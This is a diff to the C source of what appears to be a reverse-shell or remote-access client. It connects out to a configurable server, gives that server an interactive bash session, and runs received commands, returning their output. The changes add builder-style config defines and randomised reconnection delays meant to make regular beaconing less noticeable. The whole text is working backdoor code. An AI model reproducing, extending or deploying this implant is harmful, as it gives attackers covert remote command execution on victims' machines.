@@ -13,11 +13,19 @@
 #include <sys/ioctl.h>
 #include <string.h>
 #include <signal.h>
-
+#include <time.h>
 #include "simple_networking.h"
+
+// Editable values for autogen config program
+#define SERVER_IP "127.0.0.1"
+#define SERVER_PORT 8881
+#define TIMEOUT_VALUE 120
+#define EXEC_PATH "/bin/bash"
 
 // global kill flag
 int kill_rcv = 0;
+
+
 
 void kill_handler(int sig)
 {
@@ -119,16 +127,23 @@ pid_t bash_session(connection server_con)
       FD_SET(server_con.sock_fd, &forward_fds);
       FD_SET(master_fd, &forward_fds);
 
+      struct timeval timeout;
+      timeout.tv_sec = TIMEOUT_VALUE;
+      timeout.tv_usec = 0;
+
       // See if there's a file descriptor ready to read
-      return_val = select(master_fd + 1, &forward_fds, NULL, NULL, NULL);
+      return_val = select(master_fd + 1, &forward_fds, NULL, NULL, &timeout);
       // I know, this is ugly... I tried implementing it as an if.. on the return val but that broke it :/
       switch (return_val)
       {
         case -1:
           fprintf(stderr, "Error %d on select\n", errno);
-          sleep(1);
-          break;
+          return pid;
         
+        case 0:
+          printf("timed out\n");
+          return pid;
+
         default:
         // See if we've got something to read on our connection to the server
           if (FD_ISSET(server_con.sock_fd, &forward_fds))
@@ -212,7 +227,7 @@ pid_t bash_session(connection server_con)
 
     // Execvp is a bit funky with args, so create an array with only bash in it
     // This took like 3 days to work out...
-    char *args[] = {"/bin/bash", NULL};
+    char *args[] = {EXEC_PATH, NULL};
     execvp(args[0], args);
 
     // In theory we shouldn't get to here, so something has gone horribly wrong...
@@ -239,7 +254,7 @@ void parse_single_command(message data_recieved, connection server_con)
     }
 
     // Read data from pipe character-by-character into buffer
-    char *buffer = malloc(10);
+    char *buffer = malloc(2);
     char character_read;
     int length = 0;
     while ((character_read = fgetc(cmdptr)) != EOF)
@@ -249,10 +264,7 @@ void parse_single_command(message data_recieved, connection server_con)
       length++;
 
       // Increase the buffer size if needed
-      if (length == strlen(buffer))
-      {
-        buffer = realloc(buffer, length + 10);
-      }
+      buffer = realloc(buffer, length + 1);
     }
 
     buffer[length] = '\0';
@@ -260,6 +272,8 @@ void parse_single_command(message data_recieved, connection server_con)
     // Send the data and close the pipe
     send(server_con.sock_fd, buffer, length, 0);
     pclose(cmdptr);
+    free(buffer);
+    free(cmdstr);
 }
 
 int main(void)
@@ -278,7 +292,7 @@ int main(void)
 
   // LEAVE COMMENTED DURING DEV
   //signal(SIGINT, kill_handler);
-  connection server_con = connect_to("127.0.0.1", 8881);
+  connection server_con = connect_to(SERVER_IP, SERVER_PORT);
 
   // Check if the struct has been filled
   if (server_con.dest_ip == NULL)
@@ -297,8 +311,14 @@ int main(void)
     if (strcmp(data_recieved.data, "\000") == 0){
       close(server_con.sock_fd);
       printf("Server dropped. Sleeping.\n");
-      sleep(120);
-      connection server_con = connect_to("127.0.0.1", 8881);
+
+      // Set a random sleep time to prevent regular reconnection attempts
+      srand(time(NULL));
+      int time_to_sleep = rand() % 120;
+      sleep(time_to_sleep);
+
+      // Attempt to reconnect to the server
+      connection server_con = connect_to(SERVER_IP, SERVER_PORT);
       printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);
     }
 
